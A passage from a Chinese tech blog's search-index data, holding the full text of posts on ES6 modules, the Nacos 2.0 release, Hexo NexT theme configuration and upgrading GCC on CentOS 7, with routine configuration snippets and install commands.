error);}); 模块化模块化介绍模块化就是把代码进行拆分，方便重复利用。类似 Java 中的导包操作：要使用一个包，必须先导包。而 JavaScript 中没有包的概念，换来的是模块。模块功能主要由两个指令构成： export 和 import。 export：用于规定模块的对外接口 import：用于导入其他模块提供的功能 export 指令比如定义一个 JavaScript 文件 hello.js，里面有一个对象，可以使用 export 指令将这个对象导出： 1234567const util = { sum (a, b) { return a + b; }}export {util}; 当然，也可以简写为： 12345export const util = { sum (a, b) { return a + b; }} export 指定不仅可以导出对象，一切 JavaScript 变量都可以导出，包括基本类型变量、函数、数组、对象。当要导出多个值时，还可以简写，比如定义 user.js 文件： 123var name = "jack"var age = 21export {name, age} 在上面的导出代码中，都明确指定了导出的变量名，这样其它人在导入使用时就必须准确写出变量名，否则就会出错。因此 JavaScript 提供了 default 关键字，可以对导出的变量名进行省略 12345export default { sum (a, b) { return a + b; }} import 指令使用 export 命令定义了模块的对外接口以后，其他 JavaScript 文件就可以通过 import 指令加载这个模块。 1234import util from \'hello.js\'// 调用util对象中的属性util.sum(1, 2); 批量导入前面在 user.js 中导出的 name 和 age 变量 123import {name, age} from \'user.js\'console.log(name + " , 今年" + age + "岁了"); 浏览器支持说明上面的代码暂时无法直接在浏览器运行，因为浏览器目前还不支持 ES6 的导入和导出功能。除非借助于第三方工具，将 ES6 的语法进行编译降级到 ES5，比如 Babel 工具。值得一提的是，Babel 是一个工具链，主要用于将 ES6+ 版本的代码转换为向后兼容的 JavaScript 语法，以便能够运行在当前和旧版本的浏览器或其他环境中。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"Nacos 2.0 发布，性能提升 10 倍",url:"/posts/57722de1.html",text:'前言继 Nacos 1.0 发布以来，Nacos 迅速被成千上万家企业采用，并构建起强大的生态。但是随着用户深入使用，逐渐暴露一些性能问题，因此启动了 Nacos 2.0 的隔代产品设计，时隔半年终于将其全部实现，实测性能提升 10 倍，相信能满足所有用户的性能需求。 Nacos 简介Nacos 是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。它孵化于阿里巴巴，成长于十年双十一的洪峰考验，沉淀了简单易用、稳定可靠、性能卓越的核心竞争力。 Nacos 2.0 架构2021 年 03 月 30 日，Nacos 2.0 正式对外发布。全新的 2.0 架构不仅将性能大幅提升 10 倍，而且内核进行了分层抽象，并且实现插件扩展机制。Nacos 2.0 架构层次如下图，它相比 Nacos 1.X 的最主要变化是： 通信层统一到 gRPC 协议，同时完善了客户端和服务端的流量控制和负载均衡能力，提升的整体吞吐。 将存储和一致性模型做了充分抽象分层，架构更简单清晰，代码更加健壮，性能更加强悍。 设计了可拓展的接口，提升了集成能力，如让用户扩展实现各自的安全机制。 Nacos 2.0 服务发现升级一致性模型Nacos 2.0&nbsp;架构下的服务发现，客户端通过 gRPC，发起注册服务或订阅服务的请求。服务端使用 Client 对象来记录该客户端使用 gRPC 连接发布了哪些服务，又订阅了哪些服务，并将该 Client 进行服务间同步。由于实际的使用习惯是服务到客户端的映射，即服务下有哪些客户端实例；因此 2.0 的服务端会通过构建索引和元数据，快速生成类似 1.X 中的 Service 信息，并将 Service 的数据通过 &nbsp;gRPC Stream 进行推送。 Nacos 2.0 配置管理升级通信机制配置管理之前用 Http1.1 的 Keep Alive 模式 30s 发一个心跳模拟长链接，协议难以理解，内存消耗大，推送性能弱，因此 2.0 通过 gRPC 彻底解决这些问题，内存消耗大量降低。 Nacos 2.0 架构优势 Nacos 2.0 大幅降低了资源消耗，提升吞吐性能，优化客户端和服务端交互，对用户更加友好；虽然可观测性略微下降，但是整体性价比非常高。 Nacos 2.0 项目演进自从 Nacos1.X 版本突破 10000 Star 后，随着用户深入和大规模使用开始逐渐暴露 Nacos1.X 的性能问题，借此 Nacos 开启了 2.0 的发展阶段，全面升级了通信协议、服务一致性模型、插件化支持、支持服务网格生态和多语言生态。 长连接支持Nacos1.x 版本主要基于 HTTP 短连接构建服务注册与发现、配置管理系统。随着用户的服务量级的增大，HTTP 短连接架构暴露了一些问题。为了克服短连接的固有的技术瓶颈，Nacos 社区针对 HTTP 短连接架构进行了一次基于长连接的重构升级。 在 Nacos 1.X 架构中，配置中心的推送功能通过长轮询构建，周期性地由客户端主动发送 HTTP 请求并在发生更新时返回变更内容；而服务注册中心的推送则通过 UDP 推送 + HTTP 定期对账来实现。然而，配置中心的长轮训、服务注册中心的定期对账，都需要周期性地对于服务端进行一次主动建立连接和配置传送，增大服务端的内存开销；随着 Nacos 用户的服务数和配置数规模的增大，服务端的内存泄漏风险也大大增加。为了更好的支撑用户的性能要求，克服 HTTP 短连接架构固有的性能瓶颈，Nacos 社区在阿里巴巴集团内部充分验证的基础上，进行了一次基于长连接的重构升级。长连接时代的 Nacos2.x 在原本 1.x 的架构基础上新增了对 gRPC 长连接模型的支持，同时保留对旧客户端和 OpenAPI 的兼容。 通信层目前通过 gRPC 实现了长连接 RPC 调用和推送能力。升级完成之后，服务变化、配置变更等信息会通过 gRPC 的双向流主动推送给客户端，而客户端只需要针对各个长连接主动发送轻量级的心跳即可。升级后的技术架构极大地减少了服务端处理数据的开销；同时，由于长连接基于可复用 TCP 的机制，也大大降低了网络堵塞的风险。 MCP 及 XDS 协议支持通过对于 MCP 协议及 XDS 协议的支持，目前服务网格生态领域已完全兼容 Nacos，为 Istio 接入 Nacos 注册中心提供零侵入、高性能的微服务以及网关解决方案，帮助用户在使用非 K8S 服务发现的情况下，仍然可以无缝享用服务网格的无侵入式的服务治理策略。 插件化支持在插件化支持方面，Nacos 社区通过为鉴权、配置加解密、多数据源等模块进行了插件化改造，支持用户进行灵活的插件实现和改造。用户可以根据自己的业务需要，通过实现相应的 SPI 接口和 Jar 包的引入，方便地进行自定义的鉴权、加解密、多数据源等附加功能的实现。插件化升级之后，Nacos 充分实现了多种附加功能与核心功能的解耦合，可扩展性大大加强。 多语言支持随着 Nacos 2.0 对于长连接的支持，多语言客户端也迈出了一大步。当前 Golang、Java、Python、C# 等主流语言已完全拥抱 Nacos 2.0，支持通过 gRPC 协议进行高性能服务注册与发现、配置管理；另外，C++、Node.js、PHP 的 2.0 客户端仍在快速迭代开发、生产验证过程中，同时希望更多社区朋友参与进来，共同构建更加完善的 Nacos 多语言生态。 Nacos 2.0 性能提升由于 Nacos 由服务发现和配置管理两大模块构成，业务模型略有差异，因此下面分别介绍一下具体压测指标。 Nacos 2.0 服务发现的性能提升服务发现场景主要关注客户端数，服务数实例数，及服务订阅者数在大规模场景下，服务端在同步，推送及稳定状态时的性能表现。同时还关注在有大量服务在进行上下线时，系统的性能表现。 容量及稳定状态测试 该场景主要关注随着服务规模和客户端实例规模上涨，系统性能表现。 可以看到 2.0.0 版本在 10W 级客户端规模下，能够稳定的支撑，在达到稳定状态后，CPU 的损耗非常低。虽然在最初的大量注册阶段，由于存在瞬时的大量注册和推送，因此有一定的推送超时，但是会在重试后推送成功，不会影响数据一致性。反观 1.X 版本，在 10W、5W 级客户端下，服务端完全处于 Full GC 状态，推送完全失败，集群不可用；在 2W 客户端规模下，虽然服务端运行状态正常，但由于心跳处理不及时，大量服务在摘除和注册阶段反复进行，因此达不到稳定状态，CPU 一直很高。1.2W 客户端规模下，可以稳定运行，但稳态时 CPU 消耗是更大规模下 2.0 的 3 倍以上。 频繁变更测试 该场景主要关注业务大规模发布，服务频繁推送条件下，不同版本的吞吐和失败率。 频繁变更时，2.0 和 1.X 在达到稳定状态后，均能稳定支撑，其中 2.0 由于不再有瞬时的推送风暴，因此推送失败率归 0，而 1.X 的 UDP 推送的不稳定性导致了有极小部分推送出现了超时，需要重试推送。 Nacos 2.0 配置管理的性能提升由于配置是少写多读场景，所以瓶颈主要在单台监听的客户端数量以及配置的推送获取上，因此配置管理的压测性能主要集中于单台服务端的连接容量以及大量推送的比较。 Nacos 2.0 连接容量测试 该场景主要关注不同客户端规模下的系统压力。 Nacos 2.0 最高单机能够支撑 4.2w 个配置客户端连接，在连接建立的阶段，有大量订阅请求需要处理，因此 CPU 消耗较高，但达到稳态后，CPU 的消耗会变得很低，几乎没有消耗。反观 Nacos 1.X，在客户端 6000 时，稳定状态的 CPU 一直很高，且 GC 频繁，主要原因是长轮训是通过 hold 请求来保持连接，每 30s 需要回一次 Response 并且重新发起连接和请求。需要做大量的上下文切换，同时还需要持有所有 Request 和 Response。当规模达到 1.2w 客户端时，已经无法达到稳态，所以无法支撑这个量级的客户端数。 Nacos 2.0 频繁推送测试 该场景关注不同推送规模下的系统表现。 在频繁变更的场景，两个版本都处于 6000 个客户端连接中。明显可以发现 2.0 版本的性能损耗要远低于 1.X 版本。在 3000tps 的推送场景下，优化程度约优化了 3 倍。 Nacos 2.0 性能结论 针对服务发现场景，Nacos 2.0 能够在 10W 级规模下，稳定运行；相比 Nacos 1.X 版本的 1.2W 规模，提升约 10 倍。 针对配置管理场景，Nacos 2.0 单机最高能够支撑 4.2W 个客户端连接；相比 Nacos 1.X，提升了 7 倍，且推送时的性能明显好于 1.X。 Nacos 生态及 2.X 后续规划随着 Nacos 三年的发展，几乎支持了所有的 RPC 框架和微服务生态，并且引领云原生微服务生态发展。 Nacos 是整个微服务生态中非常核心的组件，它可以无缝和 K8s 服务发现体系互通，通过 MCP/XDS 协议与 Istio 通信，将 Nacos 服务下发 Sidecar；同样也可以和 CoreDNS 联合，将 Nacos 服务通过域名模式暴露给下游调用。Nacos 目前已经和各类微服务 RPC 框架融合进行服务发现；另外可以协助高可用框架 Sentinel 进行各类管理规则的控制和下发。 如果只使用 RPC 框架，有时候并不足够简单，因为部分 RPC 框架比如 gRPC 和 Thrift，还需要自行启动 Server 并告知 Client 该调用哪个 IP。这时候就需要和应用框架进行融合，比如 SCA、Dapr 等；当然也可以通过 Envoy Sidecar 来进行流量控制，应用层的 RPC 就不需要知道服务 的 IP 列表了。最后，Nacos 还可以和各类微服务网关打通，实现接入层的分发和微服务调用。 Nacos 生态在阿里的实践目前 Nacos 已经完成了自研、开源、商业化三位一体的建设，阿里内部的钉钉、考拉、饿了么、优酷等业务域已经全部采用云产品 MSE 中的 Nacos 服务，并且与阿里和云原生的技术栈无缝整合。下面以钉钉为例简单做一下介绍。 Nacos 运行在微服务引擎 MSE（全托管的 Nacos 集群）上，进行维护和多集群管理；业务的各类 Dubbo3 或 HSF 服务在启动时，通过 Dubbo3 自身注册到 Nacos 集群中；然后 Nacos 通过 MCP 协议将服务信息同步到 Istio 和 Ingress-Envoy 网关。 用户流量从北向进入集团的 VPC 网络中，先通过一个统一接入 Ingress-Tengine 网关，他可以将域名解析并路由到不同的机房、单元等。本周也同步更新了 Tengine 2.3.3 版本，内核升级到 Nginx Core 1.18.0 ，支持 Dubbo 协议 ，支持 DTLSv1 和 DTLSv1.2，支持 Prometheus 格式，从而提升阿里云微服务生态完整性、安全性、可观测性。 通过统一接入层网关后，用户请求会通过 Ingress-Envoy 微服务网关，转发到对应的微服务中，并进行调用。如果需要调用到其他网络域的服务，会通过 Ingress-Envoy 微服务网关将流量导入到对应的 VPC 网络中，从而打通不同安全域、网络域和业务域的服务。 微服务之间的相互调用，会通过 Envoy Sidecar 或传统的微服务自订阅的方式进行。最终，用户请求在各个微服务的互相调用中，完成后并返回给用户。 Nacos 2.X 的规划Nacos 2.X 将在 2.0 解决性能问题的基础上，通过插件化实现新的功能并改造大量旧功能，使得 Nacos 能够更方便，更易于拓展。 总结Nacos 2.0 作为一个跨代版本，彻底解决了 Nacos 1.X 的性能问题，将性能提升了 10 倍。并且通过抽象和分层让架构更加简单，通过插件化更好的扩展，让 Nacos 能够支持更多场景，融合更广生态。相信 Nacos2.X 在后续版本迭代后，会更加易用，解决更多微服务问题，并向着 Mesh 化进行更深入地探索。 Nacos：https://nacos.io/zh-cn Nacos Github：https://github.com/alibaba/nacos var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Hexo Next 主题详细配置之二",url:"/posts/fef9e726.html",text:'前言官方教程 Next 官方教程 - 常见问题 Next 官方教程 - 内置标签 Next 官方教程 - 第三方服务集成 版本说明本文使用各软件的版本如下： 软件 版本 hexo 3.9.0 hexo-cli 2.0.0 next 7.8 Next 第三方服务集成 百度统计集成 登录 百度统计，定位到站点的代码获取页面 复制 hm.js? 后面那串统计脚本 id，如下图所示 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1baidu_analytics: \'tug63d4s3hlw9lz2hdtfwhtl0rxay\' Next 主题自带的百度统计脚本，默认会将博客本地访问记录也统计进去，例如通过 127.0.0.1 或者 localhost 访问博客 更改 themes/next/layout/_third-party/analytics/baidu-analytics.swig 文件，替换为以下内容 1234567891011121314{%- if theme.baidu_analytics %} &lt;script{{ pjax }}&gt; var _hmt = _hmt || []; (function() { var host = window.location.host; if (host.indexOf("127.0.0.1") == -1 &amp;&amp; host.indexOf("localhost") == -1) { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?{{ theme.baidu_analytics }}"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); } })(); &lt;/script&gt;{%- endif %} 谷歌统计集成更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123google_analytics: tracking_id: \'UA-949648306-1\' only_pageview: false Next 主题自带的谷歌统计脚本，默认会将博客本地访问记录也统计进去，例如通过 127.0.0.1 或者 localhost 访问博客 更改 themes/next/layout/_third-party/analytics/google-analytics.swig 文件，替换为以下内容 123456789101112131415161718192021222324252627282930313233{%- if theme.google_analytics.tracking_id %} {%- if not theme.google_analytics.only_pageview %} &lt;script async src="https://www.googletagmanager.com/gtag/js?id={{ theme.google_analytics.tracking_id }}"&gt;&lt;/script&gt; &lt;script{{ pjax }}&gt; var host = window.location.host; window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} if (host.indexOf("127.0.0.1") == -1 &amp;&amp; host.indexOf("localhost") == -1) { gtag(\'js\', new Date()); gtag(\'config\', \'{{ theme.google_analytics.tracking_id }}\'); } &lt;/script&gt; {%- endif %} {%- if theme.google_analytics.only_pageview %} &lt;script&gt; function sendPageView() { if (CONFIG.hostname !== location.hostname) return; var uid = localStorage.getItem(\'uid\') || (Math.random() + \'.\' + Math.random()); localStorage.setItem(\'uid\', uid); navigator.sendBeacon(\'https://www.google-analytics.com/collect\', new URLSearchParams({ v : 1, tid: \'{{ theme.google_analytics.tracking_id }}\', cid: uid, t : \'pageview\', dp : encodeURIComponent(location.pathname) })); } document.addEventListener(\'pjax:complete\', sendPageView); sendPageView(); &lt;/script&gt; {%- endif %}{%- endif %} 百度自动推送集成更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1baidu_push: true Next 主题自带的百度自动推送脚本，默认在本地访问博客时也会自动推送，例如通过 127.0.0.1 或者 localhost 访问博客 更改 themes/next/layout/_third-party/baidu-push.swig 文件，替换为以下内容 123456789101112131415161718{%- if theme.baidu_push %} &lt;script{{ pjax }}&gt; (function() { var host = window.location.host; if (host.indexOf("127.0.0.1") == -1 &amp;&amp; host.indexOf("localhost") == -1) { var bp = document.createElement(\'script\'); var curProtocol = window.location.protocol.split(\':\')[0]; if (curProtocol === \'https\') { bp.src = \'https://zz.bdstatic.com/linksubmit/push.js\'; } else { bp.src = \'http://push.zhanzhang.baidu.com/push.js\'; } var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(bp, s); } })(); &lt;/script&gt;{%- endif %} Utterances 评论插件集成Utterances 的原理和 Gitment、Gitalk 类似，依赖 Github Issue，但是索取的权限更少。首先在 Github 创建新的仓库，同时为 Utterances 在 Github 上授权，让 Utterances 有权限访问新仓库的 Issue。当然也可以单独指定 Utterances 能够访问的仓库，可见其权限控制做的非常好，具体操作这里不再累述。下面给出的是 Next 安装 Utterances 评论插件的方法与相关配置内容。 12345# 进入博客的根目录$ cd ${blog-root}/# 安装插件$ npm install github:theme-next/hexo-next-utteranc --save 更改 Next 主题的配置文件 themes/next/_config.yml，添加以下内容 1234567utteranc: enable: true repo: xxxx/xxxx # Github repo such as :TrumanDu/comments pathname: pathname theme: github-light # theme: github-light, github-dark, github-dark-orange cdn: https://utteranc.es/client.js priority: # If you want to modify priority, please config in **hexo** 配置完成后，每篇文章的底部都会自动新增评论区，效果图如下： Next 使用本地字体由于 Next 默认是调用 Google Fonts API 来设置字体，正如 Next 官方所说的那样，Google Fonts API 并不稳定。对于这种情况，部分解决方案是 Google Fonts API 指向国内的镜像。但这种方式并不稳定，更好的方式是，将字体下载到站点中，再在站点里使用绝对路径的方式引用字体，相关教程如下： Next 官方设置字体教程 Next 主题字体下载与使用本地字体 当字体下载到本地站点后，更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容，由于使用了本地字体，不再使用 Google Fonts 的在线字体，因此统一设置 external: false 123456789101112131415161718192021222324252627282930313233font: enable: true # 外链字体库地址，例如 https://fonts.googleapis.com (默认值) host: https://fonts.googleapis.com # 全局字体，应用在 body 元素上 global: external: false family: Lato size: 16px # 站点标题字体 title: external: false family: size: # 页头标题字体 (h1, h2, h3, h4, h5, h6) headings: external: false family: Roboto Slab size: # 文章字体 posts: external: false family: # 代码字体，应用于 code 以及代码块 codes: external: false family: Roboto Mono var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"Centos7 升级 GCC 版本",url:"/posts/4a5f9755.html",text:'前言 本文主要介绍如何在 Centos 7 系统环境下升级 GCC 的版本，适用于部分源码包依赖高版本的 GCC 进行编译的场景。 安装 SCL SCL 可以在不覆盖原有软件包的情况下与其共存，缺点就是仅支持 64 位 SCL 仅支持安装 devtoolset-4（GCC 5.2）（不含）之后的 GCC 版本 1# yum install -y centos-release-scl 安装 GCC 使用以下命令安装 GCC，其中的 9 表示大版本号，默认安装大版本下的最新稳定版本 1# yum install -y devtoolset-9 scl-utils-build 启用 GCC 临时启用：使用以下命令临时启用 GCC，这种方式适用于临时切换系统的 GCC 版本，即开即用，仅在当前 bash 中有效 1# scl enable devtoolset-9 bash 永久启用：使用以下命令永久启用 GCC，这种方式适用于长期使用该版本进行编译，切换 bash 依然有效 1# echo "source /opt/rh/devtoolset-9/enable" &gt;&gt; /etc/profile &amp;&amp; souce /etc/profile 查看 GCC 版本 1# gcc --version var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Hexo Next 主题详细配置之一",url:"/posts/755ff30d.html",text:'前言 Next 官方教程 - 开始使用 Next 官方教程 - 主题配置 Next 官方教程 - 常见问题 Next 安装版本说明本文使用各软件的版本如下： 软件 版本 hexo 3.9.0 hexo-cli 2.0.0 next 7.8 Next 各版本的介绍值得一提的是，Next 不同版本使用的是不同的仓库，各版本的仓库如下： 年份 版本 仓库 2014 ~ 2017 v5 https://github.com/iissnan/hexo-theme-next 2018 ~ 2019 v6 ~ v7 https://github.com/theme-next/hexo-theme-next 2020 v8 https://github.com/next-theme/hexo-theme-next Next 主题与 Hexo 的版本兼容如下： Next 主题安装 7.x 版本克隆整个 Next 仓库，这里使用 Next 7.x 版本 12# 克隆代码（Next不同版本使用不同仓库）$ git clone https://github.com/theme-next/hexo-theme-next themes/next 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1theme: next 日后可以随时使用 Git 更新当前 Next 的版本，并切换到任何带标签的版本，或者切换到最新的 master 或任何其他分支。在大多数情况下，这对用户和开发人员都有用。 123456789101112131415161718# 进入主题目录$ cd themes/next# 查看带标签的版本$ git tag -lv6.0.0v6.0.1v6.0.2…# 切换到特定标签的版本$ git checkout tags/v6.0.1# 重新切换为master分支$ git checkout master# 更新代码$ git pull Next 常规配置PDF 显示Next 默认支持 PDF 自定义标签，使用格式为： {% pdf https://www.example.com/spring.pdf %}。若希望启用 PDF 的支持，需要更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容，详见官方文档 1234pdf: enable: true # Default height height: 550px 首页像显示头更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1234avatar: url: /images/avatar.png # 头像图片 rounded: true # 头像显示在圆里 rotated: true # 鼠标焦点落在头像时，是否转动头像 菜单显示中文在博客的根目录里，找到 _config.yml 文件，然后设置以下的配置项，值得一提的是，这里的字体是 zh-CN，而不是 zh-Hans 1language: zh-CN 启用文章目录更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123456toc: enable: true number: false # 自动添加目录编号 wrap: true # 每行目录字数超长自动换行 expand_all: true # 展开所有级别 max_depth: 5 # 目录的最大深度 启用文章打赏更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容，需要将收款二维码图片放到 themes/next/source/images 文件夹下，或者使用自定义的图片目录路径 12345678reward_settings: enable: true animation: false comment: 坚持原创技术分享，您的支持将鼓励我继续创作！reward: wechatpay: /images/wechatpay.png alipay: /images/alipay.png 添加版权声明更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12345creative_commons: license: by-nc-sa # License类型： by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero sidebar: false # 在侧边栏有一个版权的图片链接 post: true # 在每一篇文章末尾自动增加本文作者、本文链接、版权声明信息 language: deed.zh # 点击链接后显示的版权信息的语言 如果需要自定义文章底部版权信息的，可以自行修改 themes/next/layout/_partials/post/post-copyright.swig 模版文件来实现 添加标签页面通过 Hexo 创建一个标签页面 12345# 进入博客的根目录$ cd ${blog-root}/# 创建标签页$ hexo new page tags 创建完标签页后，发现 source 文件夹下会多了 tags/index.md 文件，这个文件是用于显示站点内所有分类标签的，复制以下内容到 tags/index.md 中，必须使用 --- 包裹配置内容，否则配置无效 123456---title: 标签type: "tags"comments: falsedate: 2021-04-05 17:13:00--- 若博客有集成评论服务，标签页面也会带有评论，需要关闭的话，请添加字段 comments 并将值设置为 false 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12menu: tags: /tags/ || fa fa-tags 添加网站备案号更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123beian: enable: true icp: \'粤ICP备19024664号\' 启用不蒜子统计更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12345678busuanzi_count: enable: true total_visitors: true total_visitors_icon: fa fa-user total_views: true total_views_icon: fa fa-eye post_views: true post_views_icon: fa fa-eye 首页不显示文章描述摘录Next 主题默认会在首页里将文章描述摘录为前言文本，但在首页显示一篇文章的部分内容，并提供一个链接跳转到全文页面是一个常见的需求。 NexT 提供三种方式来控制文章在首页的显示方式，也就是说，在首页显示文章的摘录并显示 阅读全文 按钮，可以更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1excerpt_description: false 建议使用 &lt;!-- more --&gt;，除了可以精确控制需要显示的摘录内容以外，这种方式也可以让 Hexo 中的插件更好的识别 Next 进阶配置启用 PjaxPjax 主要用于加速 Web 页面的切换速度，同时也可以用来解决 Aplayer 音频播发器切换页面后播放出现中断的问题 12345# 进入Next主题的目录$ cd themes/next# 下载资源文件$ git clone https://github.com/theme-next/theme-next-pjax source/lib/pjax 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1pjax: true 启用背景 3D 动画Next 主题默认支持 3D 背景动画，官方配置教程可以看这里，前提是需要下载指定的静态资源文件或者使用 CDN 静态资源文件 12345# 进入Next主题的目录$ cd themes/next# 下载3D资源文件$ git clone https://github.com/theme-next/theme-next-three source/lib/three 或者更改 Next 主题的配置文件 themes/next/_config.yml，通过以下配置内容来指定 CDN 静态资源文件的 URL 12345vendors: three: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js three_waves: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/three-waves.min.js canvas_lines: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_lines.min.js canvas_sphere: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_sphere.min.js 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12345three: enable: true three_waves: true # 背景3D动画样式一 canvas_lines: false # 背景3D动画样式二 canvas_sphere: false # 背景3D动画样式三 启用图片点击居中预览更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1mediumzoom: true 启用 Canvas Ribbon 背景Next 主题默认支持 Canvas Ribbon 背景，官方配置教程可以看这里，前提是需要下载指定的静态资源文件或者使用 CDN 静态资源文件 12345# 进入Next主题的目录$ cd themes/next# # 下载Canvas资源文件$ git clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon 或者更改 Next 主题的配置文件 themes/next/_config.yml，通过以下配置内容来指定 CDN 静态资源文件的 URL 12vendors: canvas_ribbon: //cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12345canvas_ribbon: enable: true size: 300 # Ribbon的宽度 alpha: 0.6 # Ribbon的透明度 zIndex: -1 # Ribbon的显示级别 添加页面顶部加载进度条12345# 进入Next主题的目录$ cd themes/next# 克隆代码$ git clone https://github.com/theme-next/theme-next-pace source/lib/pace 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123pace: enable: true theme: minimal 添加页面顶部阅读进度条12345# 进入Next主题的目录$ cd themes/next# 克隆代码$ git clone https://github.com/theme-next/theme-next-reading-progress source/lib/reading_progress 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12345reading_progress: enable: true position: top # 进度条的位置：top | bottom color: "#37c6c0" # 进度条的颜色 height: 3px # 进度条的大小 显示侧栏阅读进度百分比更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1234back2top: enable: true sidebar: false scrollpercent: true Next 页面样式更改超链接样式打开 CSS 文件 themes/next/source/css/_common/components/post/post.styl，在末尾添加以下 CSS 样式，颜色可自定义，在这里超链接选中状态为橙色，链接样式为蓝色 12345678910.post-body p a{ color: #0593d3; border-bottom: none; border-bottom: 1px solid #0593d3; &amp;:hover { color: #fc6423; border-bottom: none; border-bottom: 1px solid #fc6423; }} 代码块高亮样式更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123456codeblock: highlight_theme: \'night eighties\' # 代码高亮可选样式: normal | night | night eighties | night blue | night bright | solarized | solarized dark | galactic copy_button: enable: true # 启用代码复制按钮 show_result: false # 显示代码复制结果 style: flat # 代码块可选样式: default | flat | mac 文章底部标签样式打开模板文件 themes/next/layout/_macro/post.swig，将以下内容替换掉 123{%- for tag in post.tags.toArray() %} &lt;a href="{{ url_for(tag.path) }}" rel="tag"&gt;{{ tag_indicate }} {{ tag.name }}&lt;/a&gt;{%- endfor %} 替换的内容如下 123{%- for tag in post.tags.toArray() %} &lt;a href="{{ url_for(tag.path) }}" rel="tag"&gt; &lt;i class="fa fa-tag"&gt;&lt;/i&gt; {{ tag.name }}&lt;/a&gt;{%- endfor %} 页面底部添加站点运行时间在 themes/next/layout/_partials/ 目录下创建 runtime.swig 源文件，并添加如下内容 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;div id="site-runtime"&gt; &lt;span class="post-meta-item-icon"&gt; &lt;i class="fa fa-clock-o"&gt;&lt;/i&gt; &lt;/span&gt; &lt;span id="runtime"&gt;&lt;/span&gt;&lt;/div&gt;&lt;script language="javascript"&gt; function isPC() { var userAgentInfo = navigator.userAgent; var agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"]; for (var i = 0; i &lt; agents.length; i++) { if (userAgentInfo.indexOf(agents[i]) &gt; 0) { return false; } } return true; } function siteTime(openOnPC, start) { 